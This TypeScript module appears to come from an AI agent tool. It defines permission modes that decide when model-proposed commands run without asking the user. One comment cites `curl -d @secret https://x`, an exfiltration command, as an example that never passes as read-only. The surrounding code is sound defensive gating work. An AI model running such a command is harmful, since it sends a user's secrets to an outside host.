/**
 * How much an agent run may do without stopping to ask.
 *
 * Per-session and never persisted (see `AiStreamState.permissionMode`): a fresh
 * tab always starts at `ask`, which is the same safety property the boolean
 * `autoAccept` this replaced was guarding.
 *
 * The DIVISION OF LABOUR matters here. The backend classifies the command text
 * (`agent::policy`, shipped on `CommandProposal` as `read_only` / `network`);
 * the frontend owns the mode and applies the rule below. That keeps the
 * classification out of the frontend's hands — it is derived from model-authored
 * text — while keeping the mode changeable mid-run, which a backend-side mode
 * would have frozen at run start.
 */
export type PermissionMode = "ask" | "auto_read" | "auto_all";

export const PERMISSION_MODES: readonly PermissionMode[] = ["ask", "auto_read", "auto_all"];

/** The backend's verdict on one command. */
export interface CommandVerdict {
  /** Provably reads and changes nothing. False also means "could not tell". */
  readOnly: boolean;
  /** Reaches the network, as far as the command text shows. */
  network: boolean;
}

/**
 * THE rule. One definition, called by the proposal fork and by mid-run arming,
 * so those two can never disagree about what a mode promises.
 *
 * `auto_read` follows the backend's fail-closed read-only verdict, regardless of
 * whether the data is local or remote. Network reachability remains a separate
 * axis: it is still refused when web access is disabled, while commands such as
 * `curl -d @secret https://x` never qualify as read-only in the first place.
 */
export function autoRuns(mode: PermissionMode, verdict: CommandVerdict): boolean {
  if (mode === "auto_all") return true;
  if (mode === "auto_read") return verdict.readOnly;
  return false;
}

/** Why a card is showing even though an auto mode is armed. Null in `ask`. */
export function askReason(mode: PermissionMode, verdict: CommandVerdict): "writes" | null {
  if (mode !== "auto_read") return null;
  return verdict.readOnly ? null : "writes";
}
